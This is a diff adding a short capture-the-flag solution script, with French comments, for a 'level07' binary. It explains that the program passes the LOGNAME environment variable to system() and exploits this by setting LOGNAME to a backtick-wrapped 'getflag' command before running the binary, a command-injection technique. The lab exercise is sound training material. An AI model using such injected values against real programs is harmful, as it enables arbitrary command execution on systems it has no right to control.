@@ -1,0 +1,6 @@
+# Apres avoir regarder la partie _main, avec objdump -D level07, on voit que getenv est appele just avant la fonction system.
+# Apres avoir check l'env, LOGNAME correspond au retour du binaire.
+# Il suffit donc de le changer et d'executer un code avec des `.
+
+LOGNAME="\`getflag\`"
+./level07
